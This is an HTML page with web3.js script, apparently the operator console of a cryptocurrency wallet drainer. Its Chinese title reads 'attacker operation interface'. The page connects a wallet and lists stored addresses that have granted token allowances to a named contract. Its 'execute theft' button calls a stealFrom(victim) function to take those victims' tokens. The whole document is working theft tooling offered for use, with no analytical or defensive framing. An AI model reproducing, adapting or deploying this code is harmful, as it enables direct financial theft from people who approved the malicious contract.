
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>🛠️ 攻擊者操作介面 v3.1.1</title>
</head>
<body>
  <h2>🛠️ 攻擊者操作介面 v3.1.1（Ethereum 主網）</h2>
  <p>合約地址：<b>0xFbe9c4748A267562f723C67db673943F901533D6</b></p>
  <p>目前登入帳號：<span id="account">未連線</span></p>
  <p>✅ 身份驗證：你是攻擊者本人</p>
  <input id="victim" placeholder="受害者地址">
  <button onclick="drain()">執行盜取</button>
  <p>⛏️ 等待操作...</p>
  <h4>📜 最近授權地址列表：</h4>
  <ul id="list"></ul>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script>
    const contractAddress = "0xFbe9c4748A267562f723C67db673943F901533D6";
    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const abi = [{ "name": "stealFrom", "type": "function", "inputs": [
      { "type": "address", "name": "victim" }
    ], "outputs": [], "constant": false }];
    const erc20abi = [
      { "name": "allowance", "type": "function", "inputs": [
        { "type": "address", "name": "owner" },
        { "type": "address", "name": "spender" }
      ], "outputs": [{ "type": "uint256", "name": "" }], "constant": true },
    ];

    async function load() {
      const web3 = new Web3(window.ethereum);
      await window.ethereum.enable();
      const accounts = await web3.eth.getAccounts();
      document.getElementById("account").innerText = accounts[0];

      const history = JSON.parse(localStorage.getItem("history") || "[]");
      const list = document.getElementById("list");
      const erc20 = new web3.eth.Contract(erc20abi, tokenAddress);
      for (const addr of history) {
        const allowance = await erc20.methods.allowance(addr, contractAddress).call();
        if (allowance > 0) {
          const li = document.createElement("li");
          li.innerText = addr;
          list.appendChild(li);
        }
      }
    }

    async function drain() {
      const web3 = new Web3(window.ethereum);
      const contract = new web3.eth.Contract(abi, contractAddress);
      const accounts = await web3.eth.getAccounts();
      const victim = document.getElementById("victim").value;
      try {
        await contract.methods.stealFrom(victim).send({ from: accounts[0] });
        alert("✅ 執行成功");
      } catch (e) {
        alert("❌ 錯誤：" + e.message);
      }
    }

    load();
  </script>
</body>
</html>
